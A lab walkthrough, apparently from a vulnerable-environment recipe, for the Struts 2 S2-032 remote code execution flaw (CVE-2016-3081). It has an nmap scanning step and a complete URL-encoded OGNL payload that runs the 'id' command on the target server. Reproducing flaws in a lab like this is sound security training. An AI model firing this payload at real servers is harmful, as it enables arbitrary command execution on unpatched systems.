  title: S2-032 Remote Code Execution Vulnerablity（CVE-2016-3081）
  steps:
  - title: Locate the target service
    instructions: |-
      Catalog TCP ports: 8080. Identify the exposed services:

      ```bash
      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
      ```

      Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.

      Documented target URL(s): `http://{{NODE_IP}}:8080`, `http://{{NODE_IP}}:8080/index.action`.
  - title: Exploitation
    instructions: |-
      There’s a feature embedded in Struts 2 that lets the "!" (bang) character invoke a method other than execute. It is called “Dynamic Method Invocation” aka DMI.

      A simple way to use DMI is to provide HTTP parameters prefixed with `method:`. For example in the URL it could be `/category.action?method:create=foo`, the parameter value is ignored.

      The method name of DMI will be evaluated by OGNL expression engine, which would cause the RCE vulnerability.

      Visit following URL to trigger the `id` command:

      ```
      http://{{NODE_IP}}:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id
      ```

      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-032/1.png
